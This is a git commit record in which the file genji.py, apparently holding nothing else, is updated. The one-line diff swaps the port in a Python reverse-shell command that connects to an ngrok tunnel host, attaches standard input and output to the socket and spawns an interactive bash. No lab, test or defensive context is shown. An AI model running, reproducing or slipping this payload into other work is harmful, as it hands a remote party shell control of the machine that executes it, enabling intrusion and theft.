287c6e31b812cd1939a598f05b4dbb907b9da0bd
tsecnetworkmyid <severityhunting1337@protonmail.com>
2025-08-29 14:20:21 +0700

    Update genji.py

--- genji.py
+++ genji.py
@@ -1,1 +1,1 @@
-python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",10014));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",18667));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
